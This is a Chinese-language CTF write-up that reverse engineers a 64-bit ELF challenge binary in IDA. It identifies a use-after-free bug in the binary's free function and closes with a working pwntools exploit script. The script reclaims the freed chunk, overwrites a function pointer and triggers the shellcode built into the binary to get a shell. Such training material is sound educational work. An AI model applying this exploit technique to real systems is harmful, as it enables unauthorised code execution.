二、基础

现在的安全竞赛大多是CTF，CTF中的PWN题大多是linux 的ELF可执行程序，PWN呢也就是大家说的二进制(其实二进制也应该是包括逆向的)。PWN是二进制的逆向分析，漏洞挖掘、分析、利用的综合。因为二进制涉及知识面广且需要一定深度，二进制号称三难：入门难、提高难、精通难。本文将尽可能描述的通俗易懂。

必备的基础知识（只涉及本题要用到的）：

1.熟悉linux操作系统的使用。

2.熟悉docker的使用。

3.编程语言：c/c++,intel汇编，python及pythonpwntools（PWN专用库）

4.熟练使用的逆向分析工具：静态分析工具IDA

四、程序分析及解体思路

我们拿到程序的第一步就是要让它跑起来看看它实现了什么功能，怎么让它跑呢？首先要知道它要在什么地方跑，如果汽车可以在天上跑就不用要飞机了不是，这里推荐一个linux的工具 file，这个工具可以识别大多数文件的类型，如本文的pwn1：

可以看出pwn1是ELF 64bit程序，需要在linux64bit 系统中才能跑起来。

我们就在docker debian 的镜像中让它跑起来，

我们可以发现程序有三个功能：use、after、free。

Use 输出了一些信息，after输入一个长度，然后输入一些字符，free暂时还不知道有什么用，那么就逆向分析一下。

打开IDA64 拖入pwn1,进入主函数main，F5大法开启，就可以看到IDA给我们分析出来了友好的C++代码。

分析c++ 代码我们可以看出，use的功能是执行了off_602D58+8地址的代码

我们来看看这个地址的代码是什么，鼠标双击跳进去：

*v3是一个地址指针，保存了sub_401450的地址，鼠标双击再进去，*v3就是下图所示的代码，这不就是传说中的shellcode吗？原来出题人已经内置了shellcode，这样就省事多了，只要把程序的控制流劫持到这个地址，就可以拿到shell了。

 

*v3 +8 是sub_401490的调用，是程序正常的输出功能，

 接下来我们再看after的功能，

After的功能是申请一段指定大小的内存空间，然后从读取用户的输入保存到申请的内存空间。

再来看free的功能，

Free的功能是释放申请的空间，这里看到程序只是释放了申请的空间，并没有把指针置为空，这就形成了一个典型的UAF漏洞。

这里我们看下程序初始申请的内存大小，是十六进制的30换成10进制就是48

 

那么解体思路就是：

先把程序初始申请的内存使用free功能释放掉，然后根据ptmalloc的内存管理机制，申请一个同样大小的内存空间把刚释放的内存空间分配回来，然后写入一个可以执行内置shellcode的地址，接着使用use功能就可以拿到shell了。

五、Exp

#!/usr/bin/python

# -*-coding:utf-8 -*-


from pwn import*

import time

 

def main():

 

         p = remote("172.17.0.2",8888)#连接远程服务器

         p.recvuntil('1. use, 2. after, 3.free')

         p.sendline('3')#释放程序初始申请的内存

         p.recvuntil('1. use, 2. after, 3.free')

         p.sendline('2')

         p.recvuntil('Please input the length:')

         p.sendline('48')#把释放的内存申请回来，

         payload = p64(0x602D90)#转换payload，三个任选其一的payload

         time.sleep(2)

         p.sendline(payload)

         p.recvuntil('1. use, 2. after, 3.free')

         p.sendline('2')#有时候内存一次申请不回来，可以多申请一次，

         p.recvuntil('Please input the length:')

         p.sendline('48')

         time.sleep(2)

         p.sendline(payload)

         p.sendline('1')#触发shellcode

         time.sleep(2)

         p.interactive()

if __name__ =='__main__':

         main()
